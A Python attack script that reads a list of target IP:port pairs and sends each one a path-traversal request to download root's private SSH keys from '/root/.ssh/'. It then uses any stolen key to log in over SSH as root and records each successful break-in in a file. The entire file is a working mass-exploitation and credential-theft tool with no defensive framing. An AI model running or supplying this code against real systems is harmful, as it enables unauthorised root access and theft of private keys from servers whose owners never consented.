import requests
import paramiko
from paramiko import SSHClient, AutoAddPolicy
import os

def fetch_ssh_key(ip_port, key_type):
    url = f"http://{ip_port}/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../root/.ssh/id_{key_type}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            key_path = f"keys/{ip_port.replace(':', '_')}_{key_type}"
            with open(key_path, 'w') as key_file:
                key_file.write(response.text)
            os.chmod(key_path, 0o600)
            return key_path
        else:
            print(f"Failed to fetch {key_type} key from {ip_port}: {response.status_code}")
    except Exception as e:
        print(f"Error fetching {key_type} key from {ip_port}: {e}")
    return None

def attempt_ssh(ip, key_path):
    try:
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        ssh.connect(ip, port=22, username='root', key_filename=key_path)
        print(f"Successfully connected to {ip} using {key_path}")
        with open("success.txt", "a") as success_file:
            success_file.write(f"{ip} {key_path}\n")
        ssh.close()
    except Exception as e:
        print(f"Failed to connect to {ip} using {key_path}: {e}")

def main():
    key_types = ['rsa', 'ed25519', 'dsa', 'ecdsa']
    if not os.path.exists('keys'):
        os.makedirs('keys')

    with open('12.txt', 'r') as file:
        ip_ports = file.readlines()
    
    for ip_port in ip_ports:
        ip_port = ip_port.strip()
        for key_type in key_types:
            key_path = fetch_ssh_key(ip_port, key_type)
            if key_path:
                ip, port = ip_port.split(':')
                attempt_ssh(ip, key_path)

if __name__ == '__main__':
    main()
